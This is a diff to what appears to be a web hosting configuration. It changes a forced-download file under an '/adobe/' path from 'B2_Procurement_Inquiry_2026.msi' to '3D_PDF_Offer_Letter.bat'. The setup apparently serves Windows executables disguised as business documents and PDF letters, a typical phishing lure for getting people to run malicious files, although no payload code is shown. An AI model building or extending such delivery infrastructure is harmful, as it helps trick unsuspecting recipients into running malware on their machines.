@@ -19,7 +19,7 @@
       ]
     },
     {
-      "source": "/adobe/B2_Procurement_Inquiry_2026.msi",
+      "source": "/adobe/3D_PDF_Offer_Letter.bat",
       "headers": [
         {
           "key": "Content-Type",
@@ -27,7 +27,7 @@
         },
         {
           "key": "Content-Disposition",
-          "value": "attachment; filename=\"B2_Procurement_Inquiry_2026.msi\""
+          "value": "attachment; filename=\"3D_PDF_Offer_Letter.bat\""
         }
       ]
     }
@@ -40,3 +40,4 @@
     }
   ]
 }
+
